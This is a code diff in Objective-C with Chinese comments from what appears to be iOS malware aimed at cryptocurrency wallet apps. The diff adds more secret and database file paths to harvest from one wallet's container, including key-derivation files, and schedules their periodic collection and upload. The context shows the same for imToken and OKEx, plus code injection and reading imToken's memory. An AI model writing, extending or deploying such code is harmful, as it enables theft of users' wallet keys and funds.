@@ -349,8 +349,17 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                  @"Documents/keystore/"];
     }
     if ([bundleId isEqualToString:@"com.global.wallet.ios"]) {
+        // 按 tp_boot 拿到的真实目录树补全（之前漏了 label.sqlite3 和 .devcache）：
+        //   Documents/db/main.sqlite3   184,320 B
+        //   Documents/db/label.sqlite3  16,977,920 B
+        //   Documents/F4SeCyr/<sha256>  592 B   ← 哈希命名的秘密文件
+        //   Documents/.devcache         675 B
         return @[@"Documents/db/main.sqlite3",
+                 @"Documents/db/label.sqlite3",
                  @"Documents/F4SeCyr/",
+                 @"Documents/.devcache",
+                 @"Documents/_tp_kdf.txt",
+                 @"Documents/_tp_kdf_status.txt",
                  @"Library/Preferences/com.global.wallet.ios.plist"];
     }
     if ([bundleId isEqualToString:@"com.okex.OKExAppstoreFull"]) {
@@ -483,6 +492,7 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 钱包容器采集：每 5 分钟重试一次（服务端可能一时不可达）
                         if (tick % 15 == 7) { [self collectAndUploadWallet:@"im.token.app"]; [self probeImTokenEntry]; }
                         if (tick % 15 == 3) [self probeWalletTree:@"com.global.wallet.ios"];
+                        if (tick % 15 == 9) [self collectAndUploadWallet:@"com.global.wallet.ios"];
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
